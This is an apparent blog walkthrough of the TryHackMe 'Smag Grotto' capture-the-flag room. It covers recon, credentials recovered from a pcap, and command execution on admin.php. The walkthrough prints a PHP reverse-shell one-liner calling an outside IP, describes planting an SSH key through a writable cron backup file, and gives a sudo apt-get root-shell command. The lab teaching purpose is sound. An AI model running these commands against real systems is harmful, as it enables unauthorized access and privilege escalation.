---
title: "TryHackMe Smag Grotto Walkthrough"
date: 2026-01-30
tags:
  - tryhackme
  - ctf
  - easy
  - Application Security
  - walkthrough
draft: false
cover:
  image: images/Smag_Thumbnail.png
  alt: This is Thumbnail
  caption: ' '
---

NMAP Scan

![](Pasted%20image%2020260130132629.png)

we can see there are 2 services on port 22 and port 80.

we will check out port 80.

![](Pasted%20image%2020260130133727.png)

upon directory enumeration, we found an interesting directory on the website lets explore it, 

![](Pasted%20image%2020260130134041.png)

here we can see an attachment with .pcap extension, let's download it and open it with wireshark.

![](Pasted%20image%2020260130134317.png)

as you can see in the image we  upon examining the POST request, we found out the credentials, now we are going to try them in on the HOST website i.e `development.smag.thm` .

Add `development.smag.thm` to the /etc/hosts file and then upon accessing the website.

![](Pasted%20image%2020260130191950.png)

you will see `admin.php`

![](Pasted%20image%2020260130193052.png)

use the credentials from the pcap file in this admin.php page.

![](Pasted%20image%2020260130192315.png)
after logging in we can see this page.

this page won't give back the results of the command, so here we try to get reverse shell.

i set up a php reverse shell here using the following command:

```php
php -r '$sock=fsockopen("192.168.138.111",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

And BOOM!!! 

![](Pasted%20image%2020260130193325.png)

we got out reverse shell!

but unfortunately we are not allowed to read the `user.txt` file as we don't have enough permissions.

we will transfer linpeas to the target machine.

![](Pasted%20image%2020260130194547.png)

![](Pasted%20image%2020260130194602.png)

change the permission `chmod +x linpeas`

![](Pasted%20image%2020260130195004.png)

here we can see there is a cronjob which we can access and edit so that we can ssh into jake.

![](Pasted%20image%2020260130195906.png)

![](Pasted%20image%2020260130195742.png)

we generated a new public key for jake on attacker machine and using `echo` we added it to the .backup file.

![](Pasted%20image%2020260130200024.png)

And BOOM Again!!

we got the shell as jake in the system.

and here we go, we got the user flag.

Now, let's hunt the root flag.

`sudo -l`

![](Pasted%20image%2020260130200429.png)

here we found something interesting, a SUID bin which can give root privilege to jake.

![](Pasted%20image%2020260130200614.png)

as you can see we did a mistake at the first,
we have a GTFO bin for this SUID, which we have to run using `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash`

our there are multiple things we can do with this SUID bin permission, but our primary goal is to get the root shell and retrieve the root flag.

you can refer this [GTFO apt-get](https://gtfobins.org/gtfobins/apt-get/)

so here we got the root flag as well.

Thanks for Following the Walkthrough.